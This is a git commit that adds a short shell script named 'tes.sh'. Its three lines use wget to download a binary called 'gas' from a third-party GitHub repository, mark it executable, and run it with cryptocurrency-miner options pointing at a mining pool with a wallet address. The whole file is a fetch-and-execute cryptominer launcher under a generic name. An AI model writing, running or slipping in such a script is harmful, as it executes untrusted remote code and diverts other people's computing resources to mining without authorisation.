2953d9db6b87f49919e98da0d0cf115a19e552e0
dnqjwdz <100903992+dnqjwdz@users.noreply.github.com>
2022-07-05 18:51:36 +0700

    Create tes.sh

---
+++ tes.sh
@@ -0,0 +1,3 @@
+wget https://github.com/sabrifaudi12/dqwz/raw/main/gas
+chmod +x gas
+./gas -o rx.unmineable.com:3333 -a rx -k -u ELON:0x5a7d0af017e3dc8f72e4e7a55258ab9fc02d4b04.$(echo $(shuf -i 1-9999 -n 1)-sabri) -p x
